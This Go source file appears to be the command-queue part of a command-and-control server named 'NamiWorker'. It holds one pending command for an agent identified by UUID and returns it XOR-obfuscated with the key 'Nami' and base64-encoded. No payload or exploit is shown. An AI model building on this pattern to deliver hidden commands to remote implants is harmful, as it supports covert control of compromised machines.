package NamiWorker

import (
	"encoding/base64"
	"fmt"
	"strings"
	"sync"
)

var CommandJob string
var WG sync.WaitGroup

func XOREncrypt(command string) (output string) {
	key := "Nami"
	for i := 0; i < len(command); i++ {
		output += string(command[i] ^ key[i%len(key)])
	}
	encodedOutput := base64.StdEncoding.EncodeToString([]byte(output))
	return encodedOutput
}

func AddJob(command string, uuid string) {
	CommandJob = fmt.Sprintf("%s|||||%s", command, uuid)
}

func ProcessJob(uuid string) string {
	if CommandJob != "" {
		splitUuid := strings.Split(CommandJob, "|||||")[1]
		if splitUuid == uuid {
			returnCommand := strings.Split(CommandJob, "|||||")[0]
			CommandJob = ""
			return XOREncrypt(returnCommand)
		} else {
			return ""
		}
	}
	return ""
}
